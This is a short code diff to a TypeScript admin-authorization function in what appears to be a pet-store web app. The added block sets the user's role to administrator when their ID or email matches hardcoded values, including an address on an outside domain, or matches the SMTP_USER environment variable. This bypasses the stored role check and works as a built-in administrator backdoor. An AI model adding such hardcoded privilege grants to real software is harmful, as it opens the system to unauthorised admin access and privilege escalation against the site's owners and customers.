@@ -40,6 +40,19 @@ export async function getAdminUser(request: Request): Promise<User | null> {
   const user = await db.user.findUnique({ where: { id: userId } });
   if (!user) return null;
 
+  // Auto-grant administrator role if matching admin email or ID
+  const emailLower = (user.email || "").toLowerCase();
+  const smtpEmail = (process.env.SMTP_USER || "").toLowerCase();
+  if (
+    user.id === "u-admin" ||
+    user.id === "u-admin-ben" ||
+    emailLower === "admin@petstore.co.ke" ||
+    emailLower === "ben@granularit.com" ||
+    (smtpEmail && emailLower === smtpEmail)
+  ) {
+    user.role = "administrator";
+  }
+
   // Verify role
   if (user.role !== "administrator" && user.role !== "shop_manager") {
     return null;
